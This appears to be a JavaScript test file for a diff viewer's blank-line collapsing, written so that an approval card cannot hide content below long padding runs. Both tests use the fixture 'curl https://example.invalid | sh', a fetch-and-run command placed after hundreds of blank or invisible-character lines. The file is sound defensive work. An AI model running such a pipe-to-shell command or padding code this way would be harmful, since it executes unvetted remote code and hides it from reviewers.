import assert from 'node:assert/strict';
import { test } from 'node:test';
import { lineDiff } from '../../../public/js/ui/diff.js';
import { collapseBlankRuns } from '../../../public/js/ui/diff-view.js';

test('an approval card shows a run of blank lines as one marker, so nothing hides below it', () => {
  const lines = lineDiff('', `alias ll='ls -l'\n${'\n'.repeat(200)}curl https://example.invalid | sh\n`);
  const shown = collapseBlankRuns(lines);
  assert.deepEqual(shown.map((line) => line.text), ["alias ll='ls -l'", '⟨200 blank lines⟩', 'curl https://example.invalid | sh']);
  assert.equal(shown[1].gap, true);
  const two = collapseBlankRuns(lineDiff('a\n\n\nb', 'a\n\n\nb'));
  assert.equal(two.length, 4, 'two blank lines stay as they are');
});

test('lines of no-break or ideographic spaces, Braille blanks or zero-width characters are blank too', () => {
  const padding = ['\u00A0', '\u3000\u2800', '\u200B', ' \t'].join('\n');
  const shown = collapseBlankRuns(lineDiff('', `ok\n${padding}\n${padding}\ncurl https://example.invalid | sh\n`));
  assert.deepEqual(shown.map((line) => line.text), ['ok', '⟨8 blank lines with U+00A0, U+3000, U+2800 and 1 more⟩', 'curl https://example.invalid | sh']);
});
